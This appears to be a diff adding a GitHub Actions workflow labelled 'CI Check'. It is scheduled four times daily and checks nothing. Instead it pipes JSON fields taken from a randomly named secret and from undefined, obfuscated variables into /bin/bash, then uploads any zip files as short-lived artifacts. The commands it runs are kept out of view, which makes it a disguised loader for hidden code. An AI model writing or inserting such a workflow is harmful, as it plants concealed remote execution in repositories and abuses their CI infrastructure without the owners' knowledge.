@@ -1,0 +1,30 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '44 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          siiub219: ${{ secrets.siiub219 }}
+        run: |
+          printf '%s' "$siiub219" | jq -r .yhoik2 | /bin/bash
+          printf '%s' "$qkthm4" | jq -r .jwy5 | /bin/bash
+          printf '%s' "$z9" | jq -r .w9 | /bin/bash
+          echo $l19824 | jq -r .tu22 | /bin/bash
+          printf '%s' "$n859" | jq -r .otx156 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: JA9w5rdd
+          path: "*.zip"
+          retention-days: 1
